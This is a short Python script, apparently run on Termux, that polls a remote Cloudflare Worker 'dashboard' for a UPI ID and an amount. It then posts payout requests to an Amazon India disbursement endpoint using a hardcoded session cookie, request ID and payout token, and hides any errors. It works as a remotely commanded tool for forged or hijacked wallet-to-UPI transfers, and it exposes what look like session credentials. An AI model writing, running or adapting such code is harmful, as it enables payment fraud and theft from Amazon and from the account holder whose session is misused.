import requests
import time

# --- CONFIG ---
WORKER_URL = "https://amaz.surendrarathode040.workers.dev/"
SID = "259-4267444-8750337"
RID = "4DACXQEE50B0W0BYF6TZ"
RX  = "4gXSfWBe/rE73wGv5Z8Dtw"

def hit_amazon(upi, amt):
    url = "https://www.amazon.in/pay/payout/disburse"
    headers = {
        "Cookie": f"session-id={SID};",
        "x-amz-rid": RID,
        "x-amazon-payout-token": RX,
        "Content-Type": "application/json",
        "User-Agent": "com.amazon.mShop.android.shopping/Android/10"
    }
    payload = {
        "amount": amt,
        "beneficiaryVpa": upi,
        "transferMode": "WALLET_TO_UPI",
        "requestToken": "MOB_" + str(int(time.time()))
    }
    r = requests.post(url, headers=headers, json=payload)
    print(f">> Payout Result: {r.text}")

print(">> Termux Bridge Active. Waiting for Dashboard...")

while True:
    try:
        # Worker se check karo koi kaam hai kya
        res = requests.get(WORKER_URL)
        data = res.json()
        
        if "upiId" in data:
            print(f">> Task Found: Sending {data['amount']} to {data['upiId']}")
            hit_amazon(data['upiId'], data['amount'])
        
    except Exception as e:
        pass # Silence is gold
    
    time.sleep(2) # Har 2 second mein check karega

